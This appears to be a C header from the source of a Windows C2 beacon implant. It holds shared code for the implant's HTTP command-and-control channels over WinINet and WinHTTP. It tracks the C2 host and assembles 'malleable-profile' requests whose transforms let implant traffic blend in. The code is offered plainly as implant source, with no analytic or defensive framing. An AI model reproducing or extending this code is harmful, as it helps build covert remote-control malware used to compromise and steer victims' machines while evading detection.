#pragma once

/* Shared, API-independent pieces of the HTTP C2 channels. Included exactly
 * once per binary by channel.cpp (WinINet) and channel_winhttp.cpp
 * (WinHTTP). The request/response loops themselves stay per-file: every
 * line of them calls a different API with different string widths, and the
 * two files are never compiled into the same binary - a full adapter-layer
 * unification would carry regression risk for zero size benefit. */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "beacon.h"
#include "profile.h"
#include "hostprof.h"

/* C2 host the current connection is bound to (set by each http_init) */
static char http_current_host[256];

/* Assemble the malleable-profile request for a GET (postbuf == NULL) or a
 * POST, applying the profile transform and Host Profiles overlay, and
 * produce the final request URI (path + parameters). */
static void http_assemble_request(profile * myprofile, char * myuri, const char * hook,
                                  int transform_setting, char * data, int dlen,
                                  char * postbuf, int postlen, int is_post) {
	int plen = (postbuf != NULL) ? postlen : dlen;

	profile_setup(myprofile, plen);
	_snprintf(myprofile->uri, 1024, "%s", hook);
	apply(setting_ptr(transform_setting), (int)setting_length(transform_setting), myprofile, data, dlen, postbuf, postlen);
	hostprof_apply(http_current_host, myprofile, is_post);

	if (strlen(myprofile->parameters) == 0)
		_snprintf(myuri, 1024, "%s", myprofile->uri);
	else
		_snprintf(myuri, 1024, "%s%s", myprofile->uri, myprofile->parameters);
}
